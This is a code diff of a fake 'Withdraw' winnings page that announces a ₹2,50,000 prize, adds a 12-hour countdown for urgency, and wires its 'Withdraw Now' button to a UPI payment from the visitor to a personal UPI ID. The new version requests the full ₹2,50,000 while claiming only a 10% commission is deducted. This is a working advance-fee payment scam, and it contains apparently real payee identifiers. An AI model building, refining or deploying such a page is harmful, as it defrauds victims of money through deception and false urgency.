@@ -3,119 +3,111 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Withdraw Winnings</title>
+  <title>Withdraw</title>
   <style>
     body {
       font-family: Arial, sans-serif;
+      background: #111;
+      color: #fff;
       text-align: center;
-      background: #f4f4f4;
-      margin: 0;
-      padding: 50px;
-    }
-    .container {
-      background: white;
       padding: 30px;
-      border-radius: 10px;
-      max-width: 500px;
-      margin: auto;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
     .amount {
-      font-size: 28px;
-      color: green;
-      margin: 20px 0;
+      font-size: 2.5em;
+      color: gold;
     }
     .note {
-      margin: 10px 0;
-      font-size: 16px;
-      color: #333;
+      margin-top: 10px;
+      font-size: 1em;
+      color: #ccc;
     }
     #countdown {
-      font-size: 20px;
-      color: #ff0000;
-      margin: 10px 0;
+      margin-top: 20px;
+      font-size: 1.5em;
+      color: #ff4444;
     }
     .btn {
-      display: inline-block;
-      background-color: #28a745;
+      margin-top: 30px;
+      padding: 15px 30px;
+      background: green;
       color: white;
-      padding: 15px 25px;
-      font-size: 18px;
-      text-decoration: none;
-      border-radius: 5px;
-      margin-top: 20px;
+      font-size: 1.2em;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
     }
     .expired {
       color: red;
-      font-size: 22px;
-      margin-top: 30px;
+      font-size: 1.5em;
+      margin-top: 40px;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <h1>Congratulations!</h1>
-    <div class="amount">Your Withdrawal Amount: ₹2,50,000</div>
-    <div class="note">To withdraw, pay 10% commission</div>
-    <div id="countdown"></div>
-    <a id="withdrawBtn" href="#" class="btn">Withdraw Now</a>
-    <div id="expiredMsg" class="expired" style="display: none;">Link Expired</div>
+  <h1>Congratulations!</h1>
+  <div class="amount">₹2,50,000</div>
+  <div class="note">Note: 10% commission will be deducted on withdrawal.</div>
+
+  <div id="countdown"></div>
+  <div id="actionArea">
+    <button class="btn" onclick="window.location.href='upi://pay?pa=ramchoudhary2315@ybl&am=250000&cu=INR'">Withdraw Now</button>
   </div>
 
-  <!-- Confetti Canvas -->
-  <canvas id="confetti-canvas" style="position:fixed;top:0;left:0;width:100%;height:100%;pointer-events:none;z-index:9999;"></canvas>
+  <!-- Celebration Sound -->
+  <audio id="celebrationSound" autoplay>
+    <source src="sounds/celebrate.mp3" type="audio/mpeg">
+  </audio>
 
-  <!-- Confetti + Music -->
-  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+  <!-- Confetti JS -->
+  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
   <script>
-    // Confetti burst
-    confetti({ particleCount: 200, spread: 90, origin: { y: 0.6 } });
+    // Fire confetti
+    confetti({
+      particleCount: 200,
+      spread: 70,
+      origin: { y: 0.6 }
+    });
 
-    // Celebration music
-    const audio = new Audio('sounds/celebrate.mp3');
-    audio.volume = 0.8;
-    audio.play().catch(err => console.log('Auto-play blocked:', err));
-    setTimeout(() => audio.pause(), 3000); // Stop after 3 seconds
+    // Stop audio after 3 sec
+    setTimeout(() => {
+      document.getElementById('celebrationSound').pause();
+    }, 3000);
 
-    // Countdown + Button Logic
-    const countdownEl = document.getElementById("countdown");
-    const withdrawBtn = document.getElementById("withdrawBtn");
-    const expiredMsg = document.getElementById("expiredMsg");
+    // 12 hour countdown logic
+    const countdownEl = document.getElementById('countdown');
+    const actionArea = document.getElementById('actionArea');
 
-    const storageKey = 'withdrawalStartTime';
-    let startTime = localStorage.getItem(storageKey);
+    const firstVisitKey = 'withdrawalFirstVisitTime3';
+    let startTime = localStorage.getItem(firstVisitKey);
 
     if (!startTime) {
       startTime = new Date().getTime();
-      localStorage.setItem(storageKey, startTime);
+      localStorage.setItem(firstVisitKey, startTime);
     } else {
       startTime = parseInt(startTime);
     }
 
-    const twelveHours = 12 * 60 * 60 * 1000;
+    const expirationTime = startTime + 12 * 60 * 60 * 1000;
 
     function updateCountdown() {
       const now = new Date().getTime();
-      const distance = startTime + twelveHours - now;
+      const distance = expirationTime - now;
 
       if (distance <= 0) {
-        countdownEl.style.display = 'none';
-        withdrawBtn.style.display = 'none';
-        expiredMsg.style.display = 'block';
+        countdownEl.innerHTML = "<div class='expired'>Link Expired</div>";
+        actionArea.innerHTML = "";
         return;
       }
 
       const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
       const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
       const seconds = Math.floor((distance % (1000 * 60)) / 1000);
-      countdownEl.innerHTML = `Time left: ${hours}h ${minutes}m ${seconds}s`;
+
+      countdownEl.innerHTML = `Link valid for: ${hours}h ${minutes}m ${seconds}s`;
     }
 
     updateCountdown();
     setInterval(updateCountdown, 1000);
-
-    // Payment redirect
-    withdrawBtn.href = "upi://pay?pa=6005973034@ybl&pn=ramchoudhary&am=10000&cu=INR";
   </script>
 </body>
 </html>
